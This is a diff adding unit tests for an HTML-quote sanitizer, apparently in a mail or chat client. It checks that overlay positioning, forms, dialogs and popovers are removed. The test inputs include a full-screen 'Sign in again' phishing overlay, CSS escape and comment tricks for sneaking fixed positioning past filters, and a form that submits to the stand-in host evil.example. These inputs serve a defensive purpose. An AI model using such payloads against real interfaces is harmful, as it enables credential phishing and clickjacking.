@@ -165,4 +165,61 @@ describe('RawHtmlQuote sanitize', () => {
   it('returns an empty string for empty input', () => {
     expect(sanitize('')).toBe('');
   });
+
+  // The quote is not in the sandboxed reader frame: a box taken out of the
+  // flow would be drawn over the app's own interface.
+  it('removes fixed, absolute and sticky positioning', () => {
+    const out = sanitize(
+      '<div style="position:fixed;inset:0;z-index:2147483647;color:red">Sign in again</div>' +
+        '<p style="position: absolute; top: 0">a</p>' +
+        '<p style="position:sticky">b</p>' +
+        '<p style="position:-webkit-sticky">c</p>',
+    );
+    expect(out).not.toMatch(/position\s*:\s*(?:fixed|absolute|sticky|-webkit-sticky)/i);
+    expect(out).toContain('color:red');
+    expect(out).toContain('Sign in again');
+  });
+
+  it('sees through CSS escapes and comments hiding fixed positioning', () => {
+    const out = sanitize(
+      '<div style="posi\\74 ion:\\66 ixed;top:0">a</div><div style="position:/**/fixed">b</div>',
+    );
+    expect(out).not.toMatch(/fixed|\\66/i);
+  });
+
+  it('keeps relative positioning, which stays in the flow', () => {
+    const out = sanitize('<p style="position:relative;color:blue">x</p>');
+    expect(out).toContain('position:relative');
+  });
+
+  it('is not misled by a quote inside a comment', () => {
+    // the browser ignores the comment, quote included, and applies the rest
+    const out = sanitize(`<div style="color:red/*'*/;position:fixed;inset:0">a</div>`);
+    expect(out).not.toMatch(/fixed/i);
+    expect(out).toContain('color:red');
+  });
+
+  it('removes positioning it cannot resolve, such as var()', () => {
+    const out = sanitize(
+      '<div style="position:var(--x,fixed)">a</div>' +
+        '<div style="--p:fixed;position:var(--p)">b</div>' +
+        '<div style="position:inherit">c</div>',
+    );
+    expect(out).not.toMatch(/position\s*:/i);
+  });
+
+  it('removes forms, form controls, dialogs and popovers', () => {
+    const out = sanitize(
+      '<form action="https://evil.example/" method="post">' +
+        '<button type="submit" formaction="https://evil.example/">View message</button>' +
+        '<select name="s"><option>One</option></select><textarea name="t">Two</textarea>' +
+        '</form>' +
+        '<dialog open style="top:0;left:0;width:100vw;height:100vh">Sign in</dialog>' +
+        '<div popover id="p">Three</div><span popovertarget="p" popovertargetaction="show">Four</span>',
+    );
+    expect(out).not.toMatch(/<(?:form|button|select|textarea|dialog)\b/i);
+    expect(out).not.toMatch(/popover|evil\.example/i);
+    for (const text of ['View message', 'One', 'Two', 'Sign in', 'Three', 'Four'])
+      expect(out).toContain(text);
+  });
 });
